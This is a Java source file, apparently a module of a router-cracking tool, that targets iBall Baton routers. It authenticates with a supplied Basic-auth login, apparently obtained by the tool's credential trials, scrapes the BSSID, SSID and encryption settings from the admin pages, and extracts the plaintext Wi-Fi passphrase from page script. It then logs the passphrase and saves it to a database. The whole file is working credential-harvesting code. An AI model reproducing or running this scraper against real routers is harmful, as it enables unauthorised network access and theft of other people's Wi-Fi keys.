/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.koreops.tauro.cli.scraper.basicauth;

import org.jsoup.HttpStatusException;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.koreops.net.def.beans.AuthCrackParams;
import org.koreops.tauro.cli.authtrial.threads.DefaultAuthTrial;
import org.koreops.tauro.cli.dao.UpdaterDao;
import org.koreops.tauro.cli.scraper.AbstractScraperAndSaver;
import org.koreops.tauro.core.loggers.Logger;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.Level;

/**
 * Scraper module for new iBall Baton Routers.
 *
 * @author Sudipto Sarkar (k0r0pt) (sudiptosarkar@visioplanet.org).
 */
public class NewIBallBatonScraper extends AbstractScraperAndSaver {

  public NewIBallBatonScraper(String host, String hostUrl, AuthCrackParams params, UpdaterDao updaterDao) {
    super(host, hostUrl, params, updaterDao);
  }

  @Override
  public boolean scrapeAndLog() {
    return this.logIBallBatonWirelessStation(hostUrl, base64Login);
  }

  /**
   * Logs the iBall Baton's Wireless Station.
   *
   * @param base64Login This is for iBall Baton's 300M Wi-Fi Mini AP Router - iBWRR300N
   */
  private boolean logIBallBatonWirelessStation(String hostUrl, String base64Login) {
    try {
      System.out.println("Cracking iBall");
      StringBuilder macAddr = null;
      String devInfoUrl = hostUrl + "status.htm";

      Document doc = Jsoup.connect(devInfoUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      Elements data = doc.select("script");

      for (Element datum : data) {
        if (datum.data().contains("bssid_drv[0] ='")) {
          String theScript = datum.data();
          int i = theScript.indexOf("bssid_drv[0] ='");
          i += "bssid_drv[0] ='".length(); // To bypass the quote
          char c = theScript.charAt(i);
          i++;
          macAddr = new StringBuilder();
          while (true) {
            macAddr.append(c);
            c = theScript.charAt(i);
            i++;
            if (c == '\'') {
              break;
            }
          }
          break;
        }
      }

      if (macAddr == null) {
        Logger.error(host + ": does not have Wireless (not on the modem at least).");
        return false;
      }

      Logger.debug(host + ": Found MAC: " + macAddr.toString());

      Map<String, String> wifiData = getIBallWirelessData(hostUrl, base64Login);
      if (wifiData == null) {
        return false;
      }
      wifiData.put("BSSID", macAddr.toString().toLowerCase());

      updaterDao.saveStation(wifiData, host);
      return true;
    } catch (HttpStatusException ex) {
      if ((ex.getStatusCode() != 404) && (ex.getStatusCode() != 501)) {
        Logger.error(host + ": HttpStatusException during logWirelessStation() " + ex.getMessage() + " ::::::: " + ex.toString());
      }
    } catch (IOException ex) {
      Logger.error(host + ": IOException during logWirelessStation(): " + ex.getMessage() + " ::::::: " + ex.getLocalizedMessage());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    } catch (Exception ex) {
      Logger.error(host + ": Exception during logWirelessStation(): " + ex.getMessage() + " ::::::: " + ex.getLocalizedMessage());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    }
    return false;
  }

  private Map<String, String> getIBallWirelessData(String hostUrl, String base64Login) {
    Map<String, String> wifiData = null;
    try {
      String wifiInfoUrl = hostUrl + "wlbasic.htm";
      Document doc = Jsoup.connect(wifiInfoUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      // Wifi is Activated (Let's assume). Let's do this!
      wifiData = new HashMap<>();
      for (Element element : doc.select("input[name=ssid0]")) {
        if (!wifiData.containsKey("SSID")) {
          wifiData.put("SSID", element.attr("value"));
          Logger.info(host + ": Found SSID: " + wifiData.get("SSID"));
        } else {
          Logger.error(host + ": Has multiple SSIDs. Modify program to handle this.");
        }
      }

      wifiInfoUrl = hostUrl + "wlsecurity_all.htm";
      doc = Jsoup.connect(wifiInfoUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      Elements checks = doc.select("input[name=wpa2ciphersuite0]");
      for (Element check : checks) {
        if (check.hasAttr("checked")) {
          String encryption = check.val();
          wifiData.put("Encryption", encryption);
          String auth = "WPA2";
          wifiData.put("AuthType", auth);
        }
      }

      if (wifiData.get("Encryption") == null) {
        for (Element check : doc.select("input[name=ciphersuite0]")) {
          if (check.hasAttr("checked")) {
            String encryption = check.val();
            wifiData.put("Encryption", encryption);
            String auth = "WPA";
            wifiData.put("AuthType", auth);
          }
        }
      }

      if (wifiData.get("Encryption") == null) {
        Logger.error(host + ": Not an iBall Baton. Probably a digiflip.");
        return null;
      }

      Logger.info(host + ": Found Encryption: " + wifiData.get("Encryption"));
      Logger.info(host + ": Found AuthType: " + wifiData.get("AuthType"));

      Elements scripts = doc.select("script");

      for (Element script : scripts) {
        if (script.data().contains("dF.pskValue0.value=")) {
          System.out.println("Found the shit!");
          String theScript = script.data();
          int i = theScript.indexOf("dF.pskValue0.value=");
          String pass = "";
          i += "dF.pskValue0.value=".length() + 1; // To bypass the quote
          char c = theScript.charAt(i);
          i++;
          while (true) {
            System.out.println(pass);
            pass += c;
            c = theScript.charAt(i);
            i++;
            if (c == '"') {
              break;
            }
          }
          wifiData.put("key", pass);
          Logger.info(host + ": Found key: " + wifiData.get("key"));
          break;
        }
      }
    } catch (HttpStatusException ex) {
      if (ex.getStatusCode() != 404) {
        Logger.error(host + ": HttpStatusException during getWirelessData() " + ex.getMessage() + " ::::::: " + ex.toString());
      }
    } catch (IOException ex) {
      Logger.error(host + ": IOException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    } catch (Exception ex) {
      Logger.error(host + ": Exception during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    }
    return wifiData;
  }
}
